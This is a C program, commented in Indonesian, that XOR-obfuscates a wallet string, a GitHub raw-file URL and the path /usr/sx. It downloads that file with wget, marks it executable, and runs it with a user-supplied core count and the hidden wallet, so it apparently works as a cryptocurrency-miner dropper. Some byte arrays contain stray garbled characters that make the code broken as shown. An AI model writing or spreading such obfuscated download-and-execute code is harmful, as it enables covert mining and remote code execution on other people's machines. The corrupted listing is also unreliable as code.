#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

// Fungsi untuk dekripsi string yang dienkripsi dengan XOR
void decrypt(char *data, int key, size_t size) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key;
        if (data[i] == '\0') {
            break;
        }
    }
}

// Fungsi untuk membersihkan memori secara aman
void secure_clean(void *ptr, size_t size) {
    if (ptr != NULL && size > 0) {
        volatile char *vptr = (volatile char *)ptr;
        while (size--) {
            *vptr++ = 0;
        }
    }
}

int main() {
    char qcore[20] = {0};
    
    // Wallet terenkripsi menggunakan XOR dengan key 0xAA
    char enc_wallet[] = {
        0xE2, 0xE0, 0xEF, 0xAB, 0xA7, 0xB4, 0x9A, 0xBE, 0xBC, 0x9A, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8,
        0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8,
        0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8,
        0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8,
        0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 极E0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8,
        0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8, 0xAB, 0xE0, 0xE2, 0xE8,
        0xAB, 0xE0, 0xE2, 0xE8, 0x00
    };
    char wallet[sizeof(enc_wallet)] = {0};
    strncpy(wallet, enc_wallet, sizeof(enc_wallet));
    decrypt(wallet, 0xAA, sizeof(wallet));

    // String terenkripsi untuk URL dan path (diperbaiki)
    char enc_url[] = {
        0x97, 0x8B, 0x8B, 0x8F, 0x8C, 0xC5, 0xD0, 0xD0, 0x98, 0x96, 0x8B, 0x97, 0x8A, 0x9D, 0xD1, 0x9C,
        0x90, 极x92, 0xD0, 0x98, 0x8A, 0x9E, 0x93, 0x98, 0x9A, 0x90, 0x93, 0xD2, 0x9C, 0x90, 0x9B, 0x9A,
        0xD0, 0x89, 0x8F, 0x93, 0xD0, 0x8D, 0x9E, 0x88, 0xD0, 0x8D, 0x9A, 0x99, 0x8C, 0xD0, 0x97, 0x9A,
        0x9E, 0x9B, 0x8C, 0xD0, 0x92, 0x9E, 0x96, 0x91, 0xD0, 0x8C, 0x87, 0x00
    };
    
    char enc_path[] = {
        0xD0, 0x8A, 0x8C, 0x8D, 0xD0, 0x8C, 0x87, 0x00
    };
    
    char url[sizeof(enc_url)] = {0};
    char path[sizeof(enc_path)] = {0};
    strncpy(url, enc_url, sizeof(enc_url));
    strncpy(path, enc_path, sizeof(enc_path));
    decrypt(url, 0xFF, sizeof(url));
    decrypt(path, 0xFF, sizeof(path));

    // Pastikan null terminator
    url[sizeof(url) - 1] = '\0';
    path[sizeof(path) - 1] = '\0';

    char command[256] = {0};
    pid_t pid;
    int status;

    // Download file dengan fork dan exec
    pid = fork();
    if (pid == -1) {
        perror("fork");
        secure_clean(wallet, sizeof(wallet));
        return 1;
    } else if (pid == 0) {
        execlp("wget", "wget", "-q", url, "-O", path, NULL);
        exit(1);
    } else {
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) {
            int exit_status = WEXITSTATUS(status);
            if (exit_status != 0) {
                fprintf(stderr, "Error: Gagal mendownload file (status: %d). Pastikan koneksi internet tersedia dan URL valid.\n", exit_status);
                secure_clean(wallet, sizeof(wallet));
                secure_clean(url, sizeof(url));
                secure_clean(path, sizeof(path));
                return 1;
            }
        } else {
            fprintf(stderr, "Error: Proses download tidak exited normally\n");
            secure_clean(wallet, sizeof(wallet));
            secure_clean(url, sizeof(url));
            secure_clean(path, sizeof(path));
            return 1;
        }
    }

    // Memberikan izin eksekusi
    pid = fork();
    if (pid == -1) {
        perror("fork");
        secure_clean(wallet, sizeof(wallet));
        secure_clean(url, sizeof(url));
        secure_clean(path, sizeof(path));
        return 1;
    } else if (pid == 0) {
        execlp("chmod", "chmod", "+x", path, NULL);
        exit(1);
    } else {
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) {
            int exit_status = WEXITSTATUS(status);
            if (exit_status != 0) {
                fprintf(stderr, "Error: Gagal memberikan izin eksekusi (status: %d)\n", exit_status);
                secure_clean(wallet, sizeof(wallet));
                secure_clean(url, sizeof(url));
                secure_clean(path, sizeof(path));
                return 1;
            }
        } else {
            fprintf(stderr, "Error: Proses chmod tidak exited normally\n");
            secure_clean(wallet, sizeof(wallet));
            secure_clean(url, sizeof(url));
            secure_clean(path, sizeof(path));
            return 1;
        }
    }

    printf("Masukan jumlah core: ");
    fflush(stdout);
    
    if (fgets(qcore, sizeof(qcore), stdin) == NULL) {
        fprintf(stderr, "Error: Gagal membaca input\n");
        secure_clean(wallet, sizeof(wallet));
        secure_clean(url, sizeof(url));
        secure_clean(path, sizeof(path));
        return 1;
    }
    
    qcore[strcspn(qcore, "\n")] = '\0';
    
    // Membuat perintah dengan eksekusi langsung
    snprintf(command, sizeof(command), "%s %s %s", path, qcore, wallet);
    
    status = system(command);
    
    if (status == -1) {
        perror("system");
        secure_clean(wallet, sizeof(wallet));
        secure_clean(url, sizeof(url));
        secure_clean(path, sizeof(path));
        secure_clean(command, sizeof(command));
        return 1;
    }
    
    // Pembersihan memori sebelum keluar
    secure_clean(wallet, sizeof(wallet));
    secure_clean(url, sizeof(url));
    secure_clean(path, sizeof(path));
    secure_clean(command, sizeof(command));
    secure_clean(qcore, sizeof(qcore));
    
    return 0;
}
